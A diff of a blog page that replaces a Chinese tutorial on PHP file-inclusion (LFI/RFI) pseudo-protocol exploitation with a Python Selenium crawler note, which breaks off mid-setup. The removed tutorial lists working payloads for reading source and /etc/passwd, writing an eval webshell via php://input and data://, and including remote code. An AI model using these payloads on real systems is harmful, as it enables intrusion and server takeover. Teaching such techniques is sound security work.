@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="文件包含," />
+  <meta name="keywords" content="笔记记录,爬虫,selenium," />
 
 
 
@@ -89,18 +89,18 @@
 
 
 
-<meta name="description" content="不是很凑巧   天气这么好。本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。">
-<meta name="keywords" content="文件包含">
+<meta name="description" content="如果能控制住粗鄙的狂喜， 就不会有深入骨髓的悲伤 . 续 python爬虫[笔记记录一]，selenium是浏览器自动化测试框架，他可以模拟用户在浏览器上点击，这篇笔记没有写基本用法，写的是一些常见的用法，当然 它虽然是浏览器自动化，但是它依旧可以和requests和beautifulsoup4搭配使用">
+<meta name="keywords" content="笔记记录,爬虫,selenium">
 <meta property="og:type" content="article">
-<meta property="og:title" content="LFI以及RFI(文件包含)伪协议利用小技巧">
-<meta property="og:url" content="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/index.html">
+<meta property="og:title" content="python爬虫[笔记记录二]">
+<meta property="og:url" content="http://smelond.com/2019/02/16/python爬虫-笔记记录二/index.html">
 <meta property="og:site_name" content="smelond&#39;s Blog">
-<meta property="og:description" content="不是很凑巧   天气这么好。本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。">
+<meta property="og:description" content="如果能控制住粗鄙的狂喜， 就不会有深入骨髓的悲伤 . 续 python爬虫[笔记记录一]，selenium是浏览器自动化测试框架，他可以模拟用户在浏览器上点击，这篇笔记没有写基本用法，写的是一些常见的用法，当然 它虽然是浏览器自动化，但是它依旧可以和requests和beautifulsoup4搭配使用">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-04T08:08:42.000Z">
+<meta property="og:updated_time" content="2019-02-16T10:55:01.383Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="LFI以及RFI(文件包含)伪协议利用小技巧">
-<meta name="twitter:description" content="不是很凑巧   天气这么好。本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。">
+<meta name="twitter:title" content="python爬虫[笔记记录二]">
+<meta name="twitter:description" content="如果能控制住粗鄙的狂喜， 就不会有深入骨髓的悲伤 . 续 python爬虫[笔记记录一]，selenium是浏览器自动化测试框架，他可以模拟用户在浏览器上点击，这篇笔记没有写基本用法，写的是一些常见的用法，当然 它虽然是浏览器自动化，但是它依旧可以和requests和beautifulsoup4搭配使用">
 
 
 
@@ -130,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/"/>
+  <link rel="canonical" href="http://smelond.com/2019/02/16/python爬虫-笔记记录二/"/>
 
 
 
 
 
-  <title>LFI以及RFI(文件包含)伪协议利用小技巧 | smelond's Blog</title>
+  <title>python爬虫[笔记记录二] | smelond's Blog</title>
   
 
 
@@ -317,7 +317,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://smelond.com/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/">
+    <link itemprop="mainEntityOfPage" href="http://smelond.com/2019/02/16/python爬虫-笔记记录二/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="smelond">
@@ -334,7 +334,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">LFI以及RFI(文件包含)伪协议利用小技巧</h1>
+          <h1 class="post-title" itemprop="name headline">python爬虫[笔记记录二]</h1>
         
 
         <div class="post-meta">
@@ -346,8 +346,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-04T10:09:52+08:00">
-                2018-09-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-16T16:11:34+08:00">
+                2019-02-16
               </time>
             
 
@@ -369,8 +369,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB安全/" itemprop="url" rel="index">
-                    <span itemprop="name">WEB安全</span>
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
                   </a>
                 </span>
 
@@ -386,7 +386,7 @@
 
           
           
-             <span id="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/" class="leancloud_visitors" data-flag-title="LFI以及RFI(文件包含)伪协议利用小技巧">
+             <span id="/2019/02/16/python爬虫-笔记记录二/" class="leancloud_visitors" data-flag-title="python爬虫[笔记记录二]">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -404,7 +404,7 @@
 
           
               <div class="post-description">
-                  <blockquote class="blockquote-center">不是很凑巧   天气这么好。</blockquote>本地文件包含（Local File Include） 远程文件包含（Remote File Include），大概就是一个文件里面包含另外一个文件，程序员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
+                  <blockquote class="blockquote-center">如果能控制住粗鄙的狂喜， 就不会有深入骨髓的悲伤 .</blockquote> 续 python爬虫[笔记记录一]，selenium是浏览器自动化测试框架，他可以模拟用户在浏览器上点击，这篇笔记没有写基本用法，写的是一些常见的用法，当然 它虽然是浏览器自动化，但是它依旧可以和requests和beautifulsoup4搭配使用
               </div>
           
 
@@ -421,29 +421,36 @@
       
 
       
-        <h3 id="包含文件的函数"><a href="#包含文件的函数" class="headerlink" title="包含文件的函数"></a>包含文件的函数</h3><ul>
-<li>require</li>
-<li>include</li>
-<li>require_once</li>
-<li>include_once</li>
-<li>包含函数一共有4个，主要作用为包含并允许指定文件。<br>比如include($file)，当$file变量可控的情况下，我们就可以包含任意文件，从而达到getshell的目的。<br>在不同的配置环境下，可以包含不同的文件。因此又分为远程文件包含和本地文件包含。<br>在allow_url_include = On以及allow_url_fopen = On时，允许远程包含文件，而默认情况下allow_url_include = Off<br>PHP.ini：<br>在php5.2以上，allow_url_fopen ：on  默认开启，allow_url_include：off  默认关闭<br><em>文件包含是否支持%00截断取决于：PHP版本&lt;=5.2 可以使用%00进行截断。</em></li>
-</ul>
-<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="php的伪协议有："><a href="#php的伪协议有：" class="headerlink" title="php的伪协议有："></a>php的伪协议有：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">zip:<span class="comment">// - 压缩流</span></span><br><span class="line">bzip2:<span class="comment">// - 压缩流</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
-<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
-<h4 id="常用的伪协议："><a href="#常用的伪协议：" class="headerlink" title="常用的伪协议："></a>常用的伪协议：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">zip:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br></pre></td></tr></table></figure>
-<h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter</span></span><br><span class="line">php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure>
-<p>php://filter用于读取源码，php://input用于执行php代码。</p>
-<p>php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取文件源代码并进行base64编码输出。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=php://filter/read=convert.base64-encode/resource=./config/db.php</span></span><br><span class="line">输出：PD9waHAgDQokY29uPW15c3FsaV9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290Iiwicm9vdCIsImRiIik7IA0KaWYgKCEkY29uKSANCnsgDQogICAgZGllKCLov57mjqXplJnor686ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgDQp9IA0K</span><br></pre></td></tr></table></figure></p>
-<p>将base64解码就可以看到db.php文件内容</p>
-<p>php://input：访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的<br>写入一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=php://input</span></span><br><span class="line">post数据:</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">"test.php"</span>,base64_decode(<span class="string">"PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4="</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><p>file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=file:///etc/passwd</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h4><p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用方式：写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar:<span class="comment">//shell.jpg/shell.php</span></span><br><span class="line">shell.php-&gt;shell.zip-&gt;shell.jpg-&gt;upload-&gt;phar:<span class="comment">//shell.jpg/shell.php</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=phar://shell.jpg/shell.php</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h4><p>zip://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，,类似phar://，使用如下：<br>利用方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar:<span class="comment">//shell.jpg/shell.php</span></span><br><span class="line">shell.php-&gt;shell.zip-&gt;shell.jpg-&gt;upload-&gt;phar:<span class="comment">//shell.jpg%23shell.php 	// %23 == #</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=zip://./shell.jpg%23shell.php</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="bzip2-协议-amp-amp-zlib"><a href="#bzip2-协议-amp-amp-zlib" class="headerlink" title="bzip2://协议 &amp;&amp; zlib://"></a>bzip2://协议 &amp;&amp; zlib://</h4><p>bzip2://协议 &amp;&amp; zlib://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2:<span class="comment">//file.bz2 	//处理的是 '.bz2' 后缀的压缩包</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.bzip2://D:/soft/phpStudy/WWW/shell.jpg</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.bzip2://./shell.jpg</span></span><br><span class="line"></span><br><span class="line">compress.zlib:<span class="comment">//file.gz 	//处理的是 '.gz' 后缀的压缩包</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=compress.zlib://./file.jpg</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><p>data://：需满足allow_url_fopen，allow_url_include同时开启才能使用:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data://text/plain,<span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data:text/plain,<span class="meta">&lt;?php</span> phpinfo()<span class="meta">?&gt;</span></span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line">http:<span class="comment">//www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs/Pg==</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="http-amp-amp-ftp"><a href="#http-amp-amp-ftp" class="headerlink" title="http:// &amp;&amp; ftp://"></a>http:// &amp;&amp; ftp://</h4><p>http:// &amp;&amp; ftp:// 需满足allow_url_fopen，allow_url_include同时开启才能使用，可访问内网主机主机<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=[http|https|ftp]:<span class="comment">//xxx/file.txt[?%23]	远程代码执行</span></span><br><span class="line">?file=[http|https|ftp]:<span class="comment">//xxx/file 	利用XSS执行任意代码</span></span><br><span class="line">?file=http:<span class="comment">//xxx/xss.php?xss=phpcode 	远程代码执行</span></span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>参考：<br><a href="http://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">http://www.freebuf.com/column/148886.html</a><br><a href="https://www.jianshu.com/p/0a8339fcc269" target="_blank" rel="noopener">https://www.jianshu.com/p/0a8339fcc269</a></p>
+        <p><a href="https://smelond.com/2019/02/11/python%E7%88%AC%E8%99%AB-%E7%AC%94%E8%AE%B0%E8%AE%B0%E5%BD%95%E4%B8%80/" title="传送门">python爬虫[笔记记录一]</a><br><a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" title="传送门" target="_blank" rel="noopener">python爬虫[笔记记录二]</a></p>
+<p>Selenium是一个用于测试Web应用程序的可移植框架。Selenium提供了一个回放（以前也是录制）工具，用于编写功能测试而无需学习测试脚本语言（Selenium IDE）。它还提供了一种特定于测试领域的语言（Selenese），可以用许多流行的编程语言编写测试，包括C＃，Groovy，Java，Perl，PHP，Python，Ruby和Scala。然后，测试可以针对大多数现代Web浏览器运行 。Selenium在Windows，Linux和macOS平台上部署 （来自wiki）</p>
+<p>我的环境：python3.7.1<br>所有代码，均有注释</p>
+<p>安装selenium<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install selenium</span><br></pre></td></tr></table></figure></p>
+<p>安装chromedriver<br>这里我使用的是chromedriver驱动，所以请注意，你需要提前下载到这些镜像站去下载chromedriver，然后将它安装在你的计算机上，并设置环境变量<br><a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">http://chromedriver.storage.googleapis.com/index.html</a><br><a href="https://npm.taobao.org/mirrors/chromedriver/" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/chromedriver/</a></p>
+<p>linux操作系统你可以直接将他复制到/usr/bin/目录下，而windows系统你只需要在计算机环境变量那个位置设置好你的chromedriver路径即可<br>或者你可以直接指定chromedriver位置，具体可以看下面代码</p>
+<h3 id="基本用法：登录"><a href="#基本用法：登录" class="headerlink" title="基本用法：登录"></a>基本用法：登录</h3><p>这是一个简单的登录，当访问页面的时候，利用time.sleep(1)来让程序等待1秒，防止页面在刷新的时候程序异常</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_selenium</span><span class="params">()</span>:</span></span><br><span class="line">    browser = webdriver.Chrome(executable_path=<span class="string">"/usr/bin/chromedriver"</span>)  <span class="comment"># 设置chromedriver路径</span></span><br><span class="line">    browser.get(<span class="string">"https://smelond.com/admin.php?a=admin"</span>)  <span class="comment"># 访问登录页面</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 注意，访问页面的时候会出现浏览器一直在转圈，所以这个时候可以将程序暂停1秒或多秒，根据你的网速</span></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">'//input [@name="username"]'</span>).send_keys(<span class="string">'admin'</span>) <span class="comment">#找到name为username的input标签，然后输入用户名admin</span></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">'//input [@name="password"]'</span>).send_keys(<span class="string">'123456'</span>) <span class="comment"># 输入密码</span></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">'//button [@name="loginsubmit"]'</span>).click()  <span class="comment"># 点击登录</span></span><br><span class="line"></span><br><span class="line">web_selenium()  <span class="comment"># 执行函数</span></span><br></pre></td></tr></table></figure>
+<h3 id="基本用法：一些常见的点击以及输入"><a href="#基本用法：一些常见的点击以及输入" class="headerlink" title="基本用法：一些常见的点击以及输入"></a>基本用法：一些常见的点击以及输入</h3><p>这里利用 switch_to.frame 切换到找到的iframe标签里面去，最后在里面输入内容，最后利用switch_to.parent_frame()回到上一级窗口中，如果iframe里面还有iframe，如果你有需要，那么你可以多次利用这个方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">browser_input</span><span class="params">(browser)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.find_element_by_link_text(<span class="string">"发布文章"</span>).click()  <span class="comment"># 利用find_element_by_link_text找到字符串并单击</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        browser.find_element_by_xpath(<span class="string">'//input [@name="subject"]'</span>).send_keys(<span class="string">"输入测试"</span>)  <span class="comment"># 在input标签里面输入内容</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        browser.switch_to.frame(browser.find_element_by_xpath(<span class="string">'//iframe [@id="e_iframe"]'</span>))  <span class="comment"># 切换到iframe标签里面去</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        browser.find_element_by_xpath(<span class="string">'//body'</span>).send_keys(<span class="string">"测试iframe"</span>)  <span class="comment"># 在iframe里面输入内容</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        browser.switch_to.parent_frame()  <span class="comment"># 跳出当前iframe，回到上一层</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">browser_input(browser) <span class="comment">#执行函数</span></span><br></pre></td></tr></table></figure>
+<h3 id="基本用法：加代理访问页面"><a href="#基本用法：加代理访问页面" class="headerlink" title="基本用法：加代理访问页面"></a>基本用法：加代理访问页面</h3><p>在有的时候，可能需要访问一些国外网站，或者某内网网站，但是你在外网无法访问，这个时候就可以利用代理去访问<br>我这里使用的是socks5，当然你可以使用https或者http去访问，方法是一样，只需要将socks5修改一下即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_proxy</span><span class="params">()</span>:</span></span><br><span class="line">    socks5 = <span class="string">"socks5://127.0.0.1:1080"</span>  <span class="comment"># 代理地址</span></span><br><span class="line">    header_options = webdriver.ChromeOptions()</span><br><span class="line">    <span class="keyword">if</span> socks5:</span><br><span class="line">        header_options.add_argument(<span class="string">"--proxy-server=%s"</span> % socks5)  <span class="comment"># 设置代理</span></span><br><span class="line">        browser = webdriver.Chrome(executable_path=<span class="string">"/usr/bin/chromedriver"</span>,</span><br><span class="line">                                   chrome_options=header_options)  <span class="comment"># 添加驱动，代理</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        browser = webdriver.Chrome(executable_path=<span class="string">"/usr/bin/chromedriver"</span>)</span><br><span class="line">    browser.get(<span class="string">"https://smelond.com/ip"</span>)  <span class="comment"># 访问页面</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">web_proxy()  <span class="comment"># 执行函数</span></span><br></pre></td></tr></table></figure>
+<h3 id="基本操作：获取页面上的html代码"><a href="#基本操作：获取页面上的html代码" class="headerlink" title="基本操作：获取页面上的html代码"></a>基本操作：获取页面上的html代码</h3><p>注意，这种办法可以获取网页源代码不存在，而在elements里面存在的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elem_text = browser.find_element_by_xpath(<span class="string">'//ul [@id="text_xx"]'</span>)  <span class="comment"># 定位到ul标签</span></span><br><span class="line">text = str(elem_text.get_attribute(<span class="string">"innerHTML"</span>))  <span class="comment"># 获取ul标签的代码</span></span><br><span class="line">...... <span class="comment">#  这个地方可以利用bs4解析一下，然后获取对应的内容</span></span><br></pre></td></tr></table></figure>
+<h3 id="其他操作：执行js代码"><a href="#其他操作：执行js代码" class="headerlink" title="其他操作：执行js代码"></a>其他操作：执行js代码</h3><p>利用execute_script可以执行js代码，因为在某些情况下，我们无法点击页面内容，原因可能是当前屏幕上selenium没有看到那个内容，内容在下一页，所以这个时候我们可以执行js代码，让屏幕下移动到纵坐标，之后就又可以进行屏幕上的操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">browser.execute_script(<span class="string">'window.stop()'</span>)              <span class="comment"># #调用js方法，同时执行javascript代码，这里的window.stop()是暂停</span></span><br><span class="line">browser.execute_script(<span class="string">"window.scrollBy(0, 700)"</span>);   <span class="comment"># 移动到指定的坐标(相对当前的坐标移动)</span></span><br><span class="line">browser.execute_script(<span class="string">"window.scrollBy(0, 800)"</span>);   <span class="comment"># 结合上面的scrollBy语句，相当于移动到700+800=1600像素位置  </span></span><br><span class="line">browser.execute_script(<span class="string">"window.scrollTo(0, 1600)"</span>);  <span class="comment"># 移动到窗口绝对位置坐标，如下移动到纵坐标1600像素位置  </span></span><br><span class="line">browser.execute_script(<span class="string">"window.scrollTo(0, 1200)"</span>);  <span class="comment"># 结合上面的scrollTo语句，仍然移动到纵坐标1200像素位置</span></span><br></pre></td></tr></table></figure>
+<h3 id="神操作：设置页面加载时间"><a href="#神操作：设置页面加载时间" class="headerlink" title="神操作：设置页面加载时间"></a>神操作：设置页面加载时间</h3><p>这个好像没多少资料，我也是之前查询资料才查询到的<br>主要是可以设置selenium加载页面多久，在页面访问比较慢的时候可以使用这个<br>当然，它是一个全局参数，你后面每次使用get方法，都生效</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_load_time</span><span class="params">()</span>:</span></span><br><span class="line">    browser = webdriver.Chrome(executable_path=<span class="string">"/usr/bin/chromedriver"</span>)  <span class="comment"># 设置chromedriver路径</span></span><br><span class="line">    browser.set_page_load_timeout(<span class="number">20</span>)  <span class="comment"># 设置加载时间,可以让页面只加载20秒</span></span><br><span class="line">    browser.set_script_timeout(<span class="number">20</span>)  <span class="comment"># 这两种设置都进行才有效</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(<span class="string">"https://smelond.com"</span>)  <span class="comment"># 访问url，如果访问速度比较慢，等待20秒</span></span><br><span class="line">        <span class="keyword">return</span> browser</span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># 如果超时，抛出异常执行下面的内容</span></span><br><span class="line">        web_load_time()</span><br></pre></td></tr></table></figure>
+<h3 id="神操作：无界面selenium"><a href="#神操作：无界面selenium" class="headerlink" title="神操作：无界面selenium"></a>神操作：无界面selenium</h3><p>这个应该是比较常用的，因为在某些情况下，我们需要用selenium自动化，之后需要设置定时，每天去对某个网站的内容进行爬取，这种情况，我们不可能天天在那个时间段登录服务器，然后执行脚本。这样是很费神的，所以selenium有一个无界面的操作，让你命令行模式也可以使用selenium</p>
+<p>运行环境centos7<br>软件：chrome  chromedriver  python3.x  Xvfb<br>使用的python库：selenium  pyvirtualdisplay</p>
+<h4 id="selenium-安装："><a href="#selenium-安装：" class="headerlink" title="selenium 安装："></a>selenium 安装：</h4><p>安装很简单 从<a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">http://chromedriver.storage.googleapis.com/index.html</a> 下载对应selenium的chromedriver版本，对应版本具体可以百度<br>然后设置软连接，设置权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s 你的chromedriver路径 /usr/bin/chromedriver</span><br><span class="line">chmod 777 chromedriver</span><br></pre></td></tr></table></figure></p>
+<h4 id="chrome-安装："><a href="#chrome-安装：" class="headerlink" title="chrome 安装："></a>chrome 安装：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /ect/yum.repos.d/  <span class="comment">#打开centos存放yum的目录</span></span><br><span class="line">vim google-chrome.repo   <span class="comment"># 新建一个google-chrome.repo</span></span><br></pre></td></tr></table></figure>
